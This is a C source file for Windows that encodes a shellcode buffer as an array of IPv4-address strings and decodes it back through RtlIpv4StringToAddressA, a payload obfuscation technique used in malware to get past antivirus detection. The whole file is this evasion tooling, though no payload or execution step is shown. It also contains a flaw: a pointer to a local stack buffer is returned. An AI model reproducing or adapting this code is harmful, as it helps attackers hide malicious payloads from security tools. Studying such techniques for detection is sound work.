#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
	PCSTR S,
	BOOLEAN Strict,
	PCSTR* Terminator,
	PVOID Addr
	);



/*Obfuscation*/

char* CreatingIpv4(int first, int second, int third, int fourth) {

	unsigned char MyIpv4[32];
	
	sprintf(MyIpv4, "%d.%d.%d.%d", first, second, third, fourth);
	
	return (char*)MyIpv4;
}

BOOL GenerateIpv4t(unsigned char* pShell, SIZE_T ShellSize) {
	
		if (pShell == NULL || ShellSize == NULL || ShellSize % 4 != 0) {
			return EXIT_FAILURE;
		}
	printf("char* Ipv4Array[%d] = { \n\t", (int)(ShellSize / 4));
	
	
	
		int max = 4, counter = 0;
	char* IP = NULL;
	for (int i = 0; i < ShellSize; i++) {
		
		
			if (max == 4) {
				counter++;
				
					IP = CreatingIpv4(pShell[i], pShell[i + 1],
						pShell[i + 2], pShell[i + 3]);
				if (i == ShellSize - 4) {
					
					printf("\"%s\"", IP);
					break;
				}
				else {
					
					printf("\"%s\", ", IP);
				}
				max = 1;
				
				if (counter % 8 == 0) {
					printf("\n\t");
				}
			}
			else {
				max++;
			}
	}
	printf("\n};\n\n");
	return TRUE;
}

/*DeObfuscation*/



BOOL Ipv4Deobfusc(IN CHAR* MyIpv4[], IN SIZE_T NOfElements, OUT PBYTE* ppDadd, OUT SIZE_T* payLSize) {

	PBYTE pBuffer = NULL, TmpBuffer = NULL;
	SIZE_T sBuffSize = NULL;
	PCSTR Baybay = NULL;
	NTSTATUS STATUS = NULL;

	fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");
	if (pRtlIpv4StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	sBuffSize = NOfElements * 4;
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	for (int i = 0; i < NOfElements; i++) {
		if ((STATUS = pRtlIpv4StringToAddressA(MyIpv4[i], FALSE, &Baybay, TmpBuffer)) != 0x0) {
			printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", MyIpv4[i], STATUS);
			return FALSE;
		}

		/*  Incr With 4 because the IPv4 Add has 4 bytes */
		TmpBuffer = (PBYTE)(TmpBuffer + 4);
	}

	*ppDadd = pBuffer;
	*payLSize = sBuffSize;
	return TRUE;
}
